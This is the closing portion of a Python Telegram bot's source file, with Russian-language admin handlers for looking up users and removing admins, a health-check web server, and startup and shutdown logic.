        user_id = int((message.text or "").strip())
        user = await db.get_user(user_id)
        if not user:
            await message.answer("Пользователь отсутствует в базе данных.")
        else:
            await message.answer(
                f"ID: {user['user_id']}\nUsername: @{user['username'] or '—'}\nИмя: {user['full_name']}\nЗвёзды: {user['stars']}\nПодключён: {'да' if user['session_string'] else 'нет'}\nИнтервал: {user['delay_seconds']} сек.\nПодпись: {'включена' if user['signature_enabled'] else 'выключена'}"
            )
    except Exception as exc:
        await message.answer(f"Ошибка: {exc}")
    await state.clear()

@dp.message(AdminFlow.remove_admin)
async def admin_remove_admin(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        if is_super(user_id):
            await message.answer("Суперадминистратора нельзя удалить отсюда.")
        else:
            await db.remove_admin(user_id)
            await db.log_admin_action(message.from_user.id, "remove_admin", user_id)
            await message.answer(f"Админ {user_id} удалён.")
    except Exception as exc:
        await message.answer(f"Ошибка: {exc}")
    await state.clear()

@dp.message()
async def unknown_message(message: Message):
    if message.from_user:
        await message.answer("Выберите действие в меню или нажмите /start.")

async def health(request):
    return web.Response(text="JingizBot is alive", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.port)
    await site.start()
    log.info("Health server listening on port %s", config.port)
    return runner

async def main():
    await db.init_db(config.database_url)
    await bot.set_my_commands([
        BotCommand(command="start", description="Запустить бота"),
        BotCommand(command="menu", description="Открыть главное меню"),
        BotCommand(command="admin", description="Панель администратора"),
        BotCommand(command="users", description="Список пользователей (админ)"),
    ])
    # Super-admin IDs аз ENV ба admins низ ворид мешаванд, аммо иҷозаташон всегда аз ENV санҷида мешавад.
    async with db.get_pool().acquire() as con:
        for admin_id in config.super_admins:
            await con.execute("INSERT INTO admins(user_id, added_by) VALUES($1,$1) ON CONFLICT(user_id) DO NOTHING", admin_id)
    runner = await start_health_server()
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        for task in list(campaign_tasks.values()) + list(timer_tasks.values()):
            task.cancel()
        for client in list(login_clients.values()):
            with suppress(Exception):
                await client.disconnect()
        await runner.cleanup()
        await bot.session.close()
        if db.pool:
            await db.pool.close()

if __name__ == "__main__":
    asyncio.run(main())
